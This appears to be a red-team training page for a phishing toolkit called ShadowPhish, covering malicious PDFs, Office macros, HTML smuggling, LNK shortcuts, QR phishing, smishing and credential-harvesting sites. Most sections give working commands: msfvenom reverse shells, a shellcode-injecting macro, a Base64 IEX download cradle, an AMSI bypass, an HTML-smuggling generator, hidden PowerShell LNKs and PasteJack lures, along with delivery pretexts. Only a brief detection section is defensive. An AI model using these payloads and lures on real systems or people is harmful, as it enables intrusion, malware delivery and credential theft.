---
layout: training-page
title: "ShadowPhish — APT Social Engineering Toolkit — Red Team Academy"
module: "Web Hacking"
tags:
  - shadowphish
  - social-engineering
  - html-smuggling
  - lnk
  - macro
  - powershell-obfuscation
  - apt-chains
  - smishing
  - vishing
  - qr-phishing
  - web-hacking
page_key: "web-shadowphish"
render_with_liquid: false
---

# ShadowPhish — APT Social Engineering Toolkit

ShadowPhish is a Python-based toolkit covering the full breadth of APT-style social engineering attack vectors. It provides a unified menu interface for generating malicious PDFs, Office macros, obfuscated PowerShell payloads, HTML smuggling files, malicious LNK shortcuts, QR code phishing, SMS/voice vishing, prebuilt phishing websites, and APT chain simulations (APT29, APT41, FIN7). Use it for awareness demonstrations, red team payload generation, and security training.

## Install

```
# Requirements: Python 3.10+, PHP (for phishing sites), GCC/MinGW (for C payloads)
git clone https://github.com/J0hn5/ShadowPhish
cd ShadowPhish
pip install -r requirements.txt

# Optional for deepfake features:
# pip install facefusion (requires ffmpeg)

# Launch:
python main.py
# → Animated splash → language selection → main toolkit menu
```

## Malicious PDF Generator

Creates a PDF that embeds a payload launch mechanism. The most practical variant embeds a JavaScript action that executes on open, or embeds an OLE object containing an EXE. Used in phishing campaigns where PDFs are expected (invoices, CVs, reports).

```
# Navigate toolkit menu: PDF Generator

# What it generates:
# - PDF with embedded JavaScript that launches a URL or local executable
# - OR PDF with embedded OLE executable (double-click to run)

# Manual equivalent using msfvenom + PDF exploit:
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=10.10.14.5 LPORT=443 \
  -f exe -o payload.exe

# Embed EXE in PDF (manual — using iTextSharp or pdfkit):
# Attach payload.exe as embedded file to the PDF
# JavaScript on-open triggers: this.exportDataObject({cName:"payload.exe",nLaunch:2})

# Detection:
# - AV scans PDF JavaScript (Acrobat disables JS by default in newer versions)
# - OLE embedded content triggers Mark-of-the-Web prompts on Windows
# - Pair with a convincing pretext to maximize open rates
```

## Word Macro with Remote Shellcode

Generates a .docm/.xlsm with a VBA macro that fetches shellcode from a remote URL at runtime, reflectively injects it into memory, and executes it — no file written to disk.

```
# Navigate toolkit menu: Word Macro Generator

# What it generates:
# - .docm file with AutoOpen() macro
# - VBA downloads shellcode from URL via XMLHTTP
# - Allocates RWX memory with VirtualAlloc
# - Copies shellcode via CopyMemory
# - Executes via CreateThread

# Example generated VBA skeleton:
# Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ...
# Sub AutoOpen()
#   Dim url As String: url = "http://10.10.14.5/sc.bin"
#   ' ... fetch + inject ...
# End Sub

# Host the shellcode:
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=10.10.14.5 LPORT=443 \
  -f raw -o sc.bin
python3 -m http.server 80    # serve sc.bin

# Start listener:
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.5; set LPORT 443; run"

# Delivery: send the .docm via email as "invoice.docm" or "quotation.docm"
# Victim: Enable Macros → AutoOpen fires → shell

# OPSEC improvement:
# - Use ScareCrow or Freeze to generate the shellcode with EDR evasion
# - Use EvilClippy to stomp VBA P-code after generation
```

## PowerShell Obfuscation

Takes a PowerShell command or script and outputs obfuscated versions using Base64 encoding, IEX (Invoke-Expression) chaining, compression (GZip), and variable substitution. Reduces static detection without changing runtime behavior.

```
# Navigate toolkit menu: PowerShell Obfuscation

# Obfuscation techniques available:
# 1. Base64 encode + -EncodedCommand flag
# 2. IEX(New-Object Net.WebClient).DownloadString → download and exec
# 3. GZip compress → Base64 → decompress at runtime
# 4. Variable substitution: $c = 'IE'; $d = 'X'; &($c+$d)
# 5. Combination (all of the above layered)

# Manual Base64 one-liner (for reference):
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc = [Convert]::ToBase64String($bytes)
Write-Host "powershell -enc $enc"

# Delivery options for the obfuscated command:
# - Paste in run dialog (Win+R)
# - Macro: Shell "powershell -enc [BASE64]", vbHide
# - LNK shortcut target: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc [BASE64]
# - Phishing email body instruction: "Paste this in PowerShell to update your VPN"

# Detection bypass note:
# AMSI scans decoded PS at runtime — Base64 alone doesn't bypass AMSI
# Use AMSI bypass prefix prepended to the actual payload:
# [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## HTML Smuggling Generator

HTML smuggling embeds a payload (EXE, ZIP, ISO) as a Base64-encoded blob inside an HTML file. When the victim opens the HTML in their browser, JavaScript reconstructs the binary client-side and triggers an automatic download. Bypasses email attachment scanning because the HTML itself is benign — no payload is present until the browser renders it.

```
# Navigate toolkit menu: HTML Smuggling

# How it works:
# 1. Payload (e.g. payload.exe) is Base64-encoded
# 2. Base64 string is embedded in the HTML
# 3. JavaScript Blob + createObjectURL reconstructs the binary
# 4. Automatic download triggered via <a href> click simulation

# Generated HTML structure (simplified):
# <script>
#   var blob = new Blob([Uint8Array.from(atob('[BASE64]'), c=>c.charCodeAt(0))]);
#   var a = document.createElement('a');
#   a.href = URL.createObjectURL(blob);
#   a.download = 'invoice.exe';
#   a.click();
# </script>

# Manual generation example:
python3 -c "
import base64, sys
payload = open('payload.exe','rb').read()
b64 = base64.b64encode(payload).decode()
html = '''<html><body><script>
var b = new Blob([Uint8Array.from(atob('%s'),c=>c.charCodeAt(0))],{type:'application/octet-stream'});
var a = document.createElement('a'); a.href = URL.createObjectURL(b);
a.download = 'update.exe'; document.body.appendChild(a); a.click();
</script></body></html>''' % b64
open('smuggle.html','w').write(html)
"

# Delivery: send smuggle.html as email attachment
# Browser renders it → payload downloads automatically
# Victim runs the downloaded file

# Common file format chain:
# 1. Email → HTML attachment (bypasses email scanner)
# 2. Browser → downloads ISO/ZIP (bypasses browser SmartScreen)
# 3. ISO mount → LNK inside (bypasses MOTW — files inside ISO have no Zone.Identifier)
# 4. LNK → executes payload
```

## Malicious LNK Shortcut Builder

Windows .lnk (shortcut) files can execute arbitrary commands via their Target and Arguments fields. LNK-based delivery bypasses MOTW when delivered inside ISO or ZIP archives, and hides the real command from casual inspection.

```
# Navigate toolkit menu: LNK Generator

# What it creates:
# A .lnk file that:
# - Shows a fake icon (PDF, Word, folder)
# - Target: C:\Windows\System32\cmd.exe /c [COMMAND]
# - Command: PowerShell encoded download-exec stager

# Manual LNK creation via PowerShell:
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Users\Public\invoice.pdf.lnk")
$lnk.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$lnk.Arguments = "-WindowStyle Hidden -enc [BASE64_PAYLOAD]"
$lnk.IconLocation = "C:\Windows\System32\shell32.dll, 23"  # PDF icon
$lnk.Save()

# MOTW bypass chain (ISO delivery):
# 1. Create ISO containing only the LNK
# 2. Email the ISO (or HTML smuggle it)
# 3. Victim mounts ISO (double-click in Windows Explorer)
# 4. Sees a PDF icon → clicks → LNK executes payload
# Files inside ISO do not inherit Zone.Identifier = 3 (Internet zone)

# Detection:
# - LNK files executing cmd.exe / powershell.exe (uncommon for documents)
# - ISO mount followed by script execution within seconds
# - Process chain: explorer.exe → cmd.exe → powershell.exe
```

## QR Code Phishing

```
# Navigate toolkit menu: QR Code Generator
# Input: URL (credential harvester, payload download, OAuth consent page)
# Output: QR code image (PNG)

# Use cases:
# - Embed in phishing email: "Scan to verify your account"
# - Print and place in office common areas: "Free WiFi — scan to connect"
# - Conference badge insert: "Scan for presentation slides"
# - Vishing follow-up: "I'll send you a QR code to complete verification"

# Mobile payload considerations:
# If targeting mobile devices, the URL should serve:
# - iOS: .mobileconfig (MDM profile) or App Store redirect
# - Android: .apk download (with "unknown sources" instruction) or Play Store

# QR phishing advantages:
# - Email security tools scan URLs in email body but often skip QR images
# - Targets switch to mobile device → MFA push fatigue more effective
# - BYOD phones often lack corporate EDR

# Detection bypass:
# Generate QR codes that encode non-obvious shortened URLs
# or use QR URL rotation (each QR encodes a different redirect URL)
```

## Smishing (SMS Phishing) & Vishing (Voice Phishing)

```
# Navigate toolkit menu: Smishing / Vishing
# Requires: Twilio account + API keys

# Smishing (SMS):
# - Input: target phone number, message template, phishing URL
# - ShadowPhish sends SMS via Twilio API
# - Use short URL service (bit.ly, rebrandly) to shorten phishing URL
# - SMS templates: package delivery, bank alert, 2FA bypass attempt

# Twilio setup:
# 1. Create account at console.twilio.com
# 2. Buy a phone number ($1/month)
# 3. Note: Account SID + Auth Token

# Manual Twilio SMS via curl:
curl -X POST "https://api.twilio.com/2010-04-01/Accounts/[SID]/Messages.json" \
  --data-urlencode "Body=ALERT: Your account was accessed. Verify: http://phish.link/verify" \
  --data-urlencode "From=+15551234567" \
  --data-urlencode "To=+1TARGET_PHONE" \
  -u "[ACCOUNT_SID]:[AUTH_TOKEN]"

# Vishing (voice call with AI voice):
# - Requires: DeepVoice TTS / ElevenLabs API
# - Generate voice audio from script text
# - Call victim via Twilio voice API
# - Audio: "This is your bank's fraud department. Press 1 to verify..."

# Detection:
# SMS from unknown number with urgency + URL = highest-risk indicator
# Caller ID spoofing visible in carrier logs
```

## APT Chain Simulations

Pre-built multi-stage attack chains that replicate the initial access and execution patterns of known threat groups. Use for awareness demonstrations and tabletop exercises.

```
# Navigate toolkit menu: APT Chains

# APT29 (Cozy Bear) chain:
# Stage 1: Spear-phishing email with PDF attachment
# Stage 2: PDF launches embedded dropper (HTML smuggling + LNK)
# Stage 3: LNK executes obfuscated PowerShell
# Stage 4: PS downloads SUNBURST/WellMess-style implant
# Stage 5: Establishes C2 over HTTPS (domain fronting pattern)

# APT41 (Double Dragon) chain:
# Stage 1: Supply chain compromise simulation (malicious update)
# Stage 2: OR: phishing with malicious Office macro
# Stage 3: Custom malware loader with code signing
# Stage 4: Lateral movement via WMI / RDP

# FIN7 (Carbanak) chain:
# Stage 1: Phishing email targeting finance teams
# Stage 2: DOCX with embedded OLE object (fake OneDrive link)
# Stage 3: Macro drops and executes JScript/VBS downloader
# Stage 4: Carbanak/BIRDWATCH-style C2 communication

# Use in training:
# Demo Mode: shows each stage visually without actual exploitation
# Live Mode: requires a controlled lab environment with consent
```

## Prebuilt Phishing Websites

```
# Navigate toolkit menu: Phishing Sites (.sites/ directory)
# ShadowPhish includes prebuilt credential harvesting templates
# inspired by Zphisher — covers major platforms

# Available templates:
# - Facebook, Instagram, Twitter/X
# - Microsoft (O365 login, OneDrive)
# - Google (Gmail, Google Drive)
# - Netflix, Spotify
# - PayPal, banking login (generic)
# - LinkedIn
# - Fake Recaptcha (PasteJack: user solves captcha → clipboard payload injected)

# Start a phishing site:
# Navigate toolkit menu → Phishing Sites → select template
# OR manually:
cd .sites/microsoft365/
php -S 0.0.0.0:8080    # starts PHP web server on port 8080

# Credentials are written to a local log file.
# Serve over HTTPS:
# 1. Use Cloudflare Tunnel (cloudflared tunnel --url localhost:8080)
# 2. Or ngrok: ngrok http 8080

# Fake Recaptcha (PasteJack):
# Victim lands on a page with a CAPTCHA
# "Prove you are human" → user clicks checkbox
# JavaScript copies malicious PowerShell command to clipboard
# Instruction shown: "Press Win+R, paste, press Enter to verify"
# Victim pastes and runs the payload from Run dialog
```

## Detection Signals

```
# HTML Smuggling:
# - Browser downloads a file whose parent process is the browser
# - Zero file-source URL (file created from blob: URI)
# - Blob URI download with .exe/.iso extension

# LNK execution:
# - LNK targeting cmd.exe/powershell.exe with encoded arguments
# - LNK created inside a mounted ISO image
# - Short LNK creation time relative to ISO mount time

# Macro execution:
# - WINWORD.exe / EXCEL.exe spawning cmd.exe or powershell.exe
# - Office process performing network connections
# - VBA macro calling VirtualAlloc / CreateThread (shellcode injection)

# PowerShell obfuscation:
# - Encoded command (-enc flag) with very long Base64 string
# - IEX patterns in script block logging (enable Script Block Logging)
# - Compression/decompression patterns in PS history
```

## Resources

- ShadowPhish — `github.com/J0hn5/ShadowPhish`
- Zphisher (phishing templates base) — `github.com/htr-tech/zphisher`
- Related: [Social-Engineer Toolkit (SET)](/web/social-engineer-toolkit/)
- Related: [Phishing Campaign Methodology](/reporting/phishing-campaign/)
- Related: [LOLBAS Reference](/evasion/lolbas-reference/)
